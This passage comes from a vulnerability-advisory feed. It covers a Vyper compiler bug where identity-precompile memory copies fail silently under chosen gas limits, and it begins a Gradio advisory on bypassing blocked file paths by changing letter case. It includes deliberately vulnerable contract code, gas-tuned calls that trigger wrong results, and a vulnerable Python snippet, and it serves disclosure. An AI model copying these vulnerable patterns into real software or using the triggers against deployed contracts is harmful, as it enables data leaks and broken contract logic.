0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
    b: DynArray[uint256, 4000] = a
    return b[0]
```

Problematic Call:
```py
print(c.foo())            # Prints 2
print(c.foo(gas=170000))  # Prints 0
```

#### Identity in ABI Encoding of Returndata

- Affected versions: 0.3.2 - 0.4.0
- Complex types such as Dynamic array with Strings inside need to be abi encoded before being returned
- In that `return` there is a memory copy which can fail

Vulnerable Code:
```py
@external
@view
def foo(x: String[1000000], y: String[1000000]) -&amp;gt; DynArray[String[1000000], 2]:
    z: DynArray[String[1000000], 2] = [x, y]
    # Some code
    return z
```

Problematic Call:
```py
calldata0 = &quot;a&quot;*10
calldata1 = &quot;b&quot;*1000000
c.foo(calldata0, calldata1)                   # Returns correct data
c.foo(calldata0, calldata1, gas=48_400_000)   # Returns incorrect data (only first part)
```

#### Assertion based on data copied through Identity

- Affected versions: 0.2.0 - 0.4.0
- An incomplete copy operation might falsify the result of a subsequent `assert`


Vulnerable Code:
```py
@internal
def bar() -&amp;gt; uint256[3000]:
    a: uint256[3000] = [2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
    return a

@external
def foo():
    s: uint256[3000] = self.bar()
    assert(s[0] == 0)
```

Problematic Call:
```py
try:
    c.foo()                     # Correctly reverts
except Exception as e:
    print(&quot;Correctly reverted&quot;)
try:
    c.foo(gas=210000)           # Incorrectly succeeds
    print(&quot;Incorrectly succeeded&quot;)
except Exception:
    pass
```

#### Identity used in `raw_revert`

- Affected versions: 0.3.8 - 0.4.0
- A copy operation might appear as part of raw_revert
- As a result the revert reason might be incorrect

Vulnerable Code:
```py
@external
def foo(_data: Bytes[10000]):
    b: Bytes[10000] = _data
    raw_revert(b)
```

Problematic Call:
```py
calldata = binascii.unhexlify(&quot;bb&quot; * 10_000)
c.foo(calldata)       # Has correct revert reason
c.foo(calldata, gas=4_800)       # Has empty revert reason, but not out-of-gas
```


#### Identity to copy static arrays

- Affected versions: 0.2.0 - 0.4.0
- Vyper might perform a memory copy for static arrays, e.g. when moving them in and out of internal functions
- As this access is especially cheap (due to the static checks) it can also happen for smaller sizes

Vulnerable Code:
```py
@external
def foo(x: uint256[2500]) -&amp;gt; uint256:
    s: uint256[2500] = x
    t: uint256[2500] = s
    return t[0]
```

Problematic Call:
```py
calldata = [2] + [0] * 2499
print(c.foo(calldata))              # Prints 2
print(c.foo(calldata, gas=74500))   # Prints 0
```


#### Identity to copy and return String or Bytes

- Affected versions: 0.20 - 0.4.0
- Multiple situations in vyper might trigger a memory copy operation, e.g. moving data in and out of internal functions
- If the target buffer is later returned, incorrect data might be returned

Vulnerable Code:
```py
@external
@view
def foo(x: String[1000000]) -&amp;gt; String[1000000]:
    return x
```

Problematic Call:
```py
calldata = &quot;a&quot;*1000000
x = c.foo(calldata)                 # Returns calldata
y = c.foo(calldata, gas=8_000_000)  # Returns empty data
```


#### Identity and accessing the length of the target data

- Affected versions: 0.3.10 - 0.4.0
- Accessing the data is fairly cheap, making it possible for smaller data copies

Vulnerable Code:
```py
@external
@view
def foo(x: String[1000000]) -&amp;gt; uint256:
    y: String[1000000] = x
    return len(y)
```

Problematic Call:
```py
calldata = &quot;a&quot;*1000000
x = c.foo(calldata)                 # Returns correct length
y = c.foo(calldata, gas=7_929_200)  # Returns incorrect length
```

#### Identity to copy and return String or Bytes

- Affected versions: 0.3.10 - 0.4.0
- Multiple situations in vyper might trigger a memory copy operation, e.g. moving data in and out of internal functions
- If the target buffer is later returned, incorrect data might be returned

Vulnerable Code:
```py
@external
@view
def foo(x: String[1000000]) -&amp;gt; String[1000000]:
    return x
```

Problematic Call:
```py
calldata = &quot;a&quot;*1000000
x = c.foo(calldata)                 # Returns calldata
y = c.foo(calldata, gas=8_000_000)  # Returns empty data
```

### Impact

A contract search was conducted and yielded no significant results.

The advisory was rated a medium because the likelihood is low, but difficult to detect by source code analysis alone, and could yield unexpected results if a contract is affected by the bug.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-j2jg-fq62-7c3h: 9.1 | <b>Gradio Blocked Path ACL Bypass Vulnerability</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-j2jg-fq62-7c3h</link>
                    <pubDate>2025-01-14T16:32:22Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-j2jg-fq62-7c3h'>https://osv.dev/vulnerability/GHSA-j2jg-fq62-7c3h</a><br>
                            <b>Published:</b> 2025-01-14T16:32:22Z<br>
                            <b>Severity:</b> 9.1<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/gradio-app/gradio/security/advisories/GHSA-j2jg-fq62-7c3h'>https://github.com/gradio-app/gradio/security/advisories/GHSA-j2jg-fq62-7c3h</a></li><li>- <a target='_blank' href='https://github.com/gradio-app/gradio/commit/6b63fdec441b5c9bf910f910a2505d8defbb6bf8'>https://github.com/gradio-app/gradio/commit/6b63fdec441b5c9bf910f910a2505d8defbb6bf8</a></li><li>- <a target='_blank' href='https://github.com/gradio-app/gradio'>https://github.com/gradio-app/gradio</a></li><li>- <a target='_blank' href='https://github.com/gradio-app/gradio/releases/tag/gradio%405.11.0'>https://github.com/gradio-app/gradio/releases/tag/gradio%405.11.0</a></li></ul><br>
                            <b>Details:</b> <b>Gradio Blocked Path ACL Bypass Vulnerability</b><br>## Summary

Gradio&#x27;s Access Control List (ACL) for file paths can be bypassed by altering the letter case of a blocked file or directory path. This vulnerability arises due to the lack of case normalization in the file path validation logic. On case-insensitive file systems, such as those used by Windows and macOS, this flaw enables attackers to circumvent security restrictions and access sensitive files that should be protected.

This issue can lead to unauthorized data access, exposing sensitive information and undermining the integrity of Gradio&#x27;s security model. Given Gradio&#x27;s popularity for building web applications, particularly in machine learning and AI, this vulnerability may pose a substantial threat if exploited in production environments.

## Affected Version

Gradio &amp;lt;= 5.6.0

## Impact

- **Unauthorized Access**: Sensitive files or directories specified in `blocked_paths` can be accessed by attackers.

- **Data Exposure**: Critical files, such as configuration files or user data, may be leaked.

- **Security Breach**: This can lead to broader application or system compromise if sensitive files contain credentials or API keys.

## Root Cause

The [`blocked_paths`](https:&#x2F;&#x2F;github.com&#x2F;gradio-app&#x2F;gradio&#x2F;blob&#x2F;main&#x2F;gradio&#x2F;blocks.py#L2310) parameter in Gradio block&#x27;s initial configuration is designed to restrict user access to specific files or directories in the local file system. However, it does not account for case-insensitive operating systems, such as Windows and macOS. This oversight enables attackers to bypass ACL restrictions by changing the case of file paths.

Vulnerable snippet: 

```python
# https:&#x2F;&#x2F;github.com&#x2F;gradio-app&#x2F;gradio&#x2F;blob&#x2F;main&#x2F;gradio&#x2F;utils.py#L1500-L1517
def is_allowed_file(
    path: Path,
    blocked_paths: Sequence[str | Path],
    allowed_paths: Sequence[str | Path],
    created_paths: Sequence[str | Path],
) -&amp;gt; tuple[
    bool, Literal[&quot;in_blocklist&quot;, &quot;allowed&quot;, &quot;created&quot;, &quot;not_created_or_allowed&quot;]
]:
    in_blocklist = any(
        is_in_or_equal(path, blocked_path) for blocked_path in blocked_paths
    )
